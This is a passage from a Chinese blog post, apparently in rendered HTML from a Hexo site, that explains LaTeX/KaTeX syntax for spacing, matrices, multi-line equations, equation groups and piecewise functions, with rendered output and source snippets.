href="#空白间距"></a> 空白间距</h3><table><thead><tr><th>语法</th><th>格式</th><th>实例</th><th>显示</th></tr></thead><tbody><tr><td>quad空格</td><td><code>a \quad b</code></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mspace width="1em"/><mi>b</mi></mrow><annotation encoding="application/x-tex">a \quad b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">b</span></span></span></span></td><td></td></tr><tr><td>两个quad空格</td><td><code>a \qquad b</code></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mspace width="2em"/><mi>b</mi></mrow><annotation encoding="application/x-tex">a \qquad b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:2em;"></span><span class="mord mathdefault">b</span></span></span></span></td><td>两个m的宽度</td></tr><tr><td>大空格</td><td><code>a \: b</code></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mtext> </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a \: b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">b</span></span></span></span></td><td>1/3m宽度</td></tr><tr><td>中等空格</td><td><code>a \; b</code></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mtext>  </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a \; b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">b</span></span></span></span></td><td>2/7m宽度</td></tr><tr><td>小空格</td><td><code>a \, b</code></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mtext> </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a \, b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span></span></span></span></td><td>1/6m宽度</td></tr><tr><td>没有空格</td><td><code>ab</code></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">ab</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span></span></span></span></td><td>没有空格</td></tr><tr><td>缩进空格</td><td><code>a \! b</code></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mtext> ⁣</mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a \! b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:-0.16666666666666666em;"></span><span class="mord mathdefault">b</span></span></span></span></td><td>缩进1/6m宽度</td></tr></tbody></table><h3 id="复杂公式"><a class="markdownIt-Anchor" href="#复杂公式"></a> 复杂公式</h3><ul><li>分段函数是非常复杂的，这时候会用到<code>LaTex</code>的<code>cases</code>语法，用<code>\begin&#123;cases&#125;</code>和<code>\end&#123;cases&#125;</code>围住即可，中间则用<code>\\</code>来分段</li></ul><h4 id="矩阵"><a class="markdownIt-Anchor" href="#矩阵"></a> 矩阵</h4><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mtable rowspacing="0.15999999999999992em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>…</mo></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>3</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>4</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>…</mo></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>⋱</mo></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{ccc}x_1 &amp; x_2 &amp;\dots\\x_3 &amp; x_4 &amp;\dots\\\vdots&amp;\vdots&amp;\ddots\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.26em;vertical-align:-1.8800000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.38em;"><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.0275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.1674999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8800000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.38em;"><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.0275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.1674999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8800000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.38em;"><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-3.8399999999999994em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-1.9799999999999998em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8800000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;array&#125;&#123;ccc&#125;</span><br><span class="line">x_1 &amp; x_2 &amp;\dots\\</span><br><span class="line">x_3 &amp; x_4 &amp;\dots\\</span><br><span class="line">\vdots&amp;\vdots&amp;\ddots</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mspace width="1em"/><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mspace width="1em"/><mrow><mo fence="true">{</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd></mtr></mtable><mo fence="true">}</mo></mrow><mspace width="1em"/><mrow><mo fence="true">∣</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd></mtr></mtable><mo fence="true">∣</mo></mrow><mspace width="1em"/><mrow><mo fence="true">∥</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd></mtr></mtable><mo fence="true">∥</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix} a &amp; b\\ c &amp; d \\\end{pmatrix}\quad\begin{bmatrix} a &amp; b \\ c &amp; d \\\end{bmatrix}\quad\begin{Bmatrix} a &amp; b \\ c &amp; d \\\end{Bmatrix}\quad\begin{vmatrix} a &amp; b \\ c &amp; d \\\end{vmatrix}\quad\begin{Vmatrix} a &amp; b \\ c &amp; d \\\end{Vmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.42401em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">b</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">b</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">b</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">}</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.47398em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26198em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47398em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">b</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.47398em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26198em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47398em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.47398em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.26198em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.47398em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">b</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.47398em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.26198em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.47398em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;pmatrix&#125; </span><br><span class="line">a &amp; b\\ </span><br><span class="line">c &amp; d \\</span><br><span class="line">\end&#123;pmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;bmatrix&#125; </span><br><span class="line">a &amp; b \\ </span><br><span class="line">c &amp; d \\</span><br><span class="line">\end&#123;bmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;Bmatrix&#125; </span><br><span class="line">a &amp; b \\ </span><br><span class="line">c &amp; d \\</span><br><span class="line">\end&#123;Bmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;vmatrix&#125; </span><br><span class="line">a &amp; b \\ </span><br><span class="line">c &amp; d \\</span><br><span class="line">\end&#123;vmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;Vmatrix&#125; </span><br><span class="line">a &amp; b \\ </span><br><span class="line">c &amp; d \\</span><br><span class="line">\end&#123;Vmatrix&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>(\begin{smallmatrix} a & b \\ c & d \end{smallmatrix}) <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">(</span><br><span class="line">\begin&#123;smallmatrix&#125; </span><br><span class="line">a &amp; b \\ </span><br><span class="line">c &amp; d </span><br><span class="line">\end&#123;smallmatrix&#125;</span><br><span class="line">) </span><br><span class="line">$$</span><br></pre></td></tr></table></figure><h4 id="长公式"><a class="markdownIt-Anchor" href="#长公式"></a> 长公式</h4><ul><li>无需对齐可使用<code>multline</code>；需要对齐使用<code>split</code>；用<code>\\</code>来分行；用<code>&amp;</code>设置对齐的位置</li></ul>\begin{multline}    x = a+b+c+{} \\     d+e+f+g  \end{multline}<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;multline&#125;    </span><br><span class="line">x &#x3D; a+b+c+&#123;&#125; \\     </span><br><span class="line">d+e+f+g  </span><br><span class="line">\end&#123;multline&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>\begin{split}x = {} & a + b + c +{}\\           & d + e + f + g\end{split}<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;split&#125;</span><br><span class="line">x &#x3D; &#123;&#125; &amp; a + b + c +&#123;&#125;\\    </span><br><span class="line">       &amp; d + e + f + g</span><br><span class="line">\end&#123;split&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><h4 id="公式组"><a class="markdownIt-Anchor" href="#公式组"></a> 公式组</h4><ul><li>不需要对齐的公式组用<code>gather</code>；需要对齐使用<code>align</code>:</li></ul>\begin{gather}a = b+c+d\\x = y+z\\5 = 4+1\\\end{gather}<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;gather&#125;</span><br><span class="line">a &#x3D; b+c+d\\</span><br><span class="line">x &#x3D; y+z\\</span><br><span class="line">5 &#x3D; 4+1\\</span><br><span class="line">\end&#123;gather&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>\begin{align}a &=b+c+d \\x &=y+z\\5 &= 4+1\end{align}<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;align&#125;</span><br><span class="line">a &amp;&#x3D;b+c+d \\</span><br><span class="line">x &amp;&#x3D;y+z\\</span><br><span class="line">5 &amp;&#x3D; 4+1</span><br><span class="line">\end&#123;align&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><h4 id="分支公式"><a class="markdownIt-Anchor" href="#分支公式"></a> 分支公式</h4><ul><li>分段函数通常用<code>cases</code>次环境携程分支公式</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>x</mi><mo separator="true">,</mo><mspace width="1em"/><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo separator="true">,</mo><mspace width="1em"/><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">y=\begin{cases}-x,\quad x\leq 0\\x, \quad x&gt;0\end{cases} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">y&#x3D;\begin&#123;cases&#125;</span><br><span class="line">-x,\quad x\leq 0\\</span><br><span class="line">x, \quad x&gt;0</span><br><span class="line">\end&#123;cases&#125; </span><br><span class="line">$$</span><br></pre></td></tr></table></figure><h4 id="定理-引理-证明-假设"><a class="markdownIt-Anchor" href="#定理-引理-证明-假设"></a> 定理、引理、证明、假设</h4><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
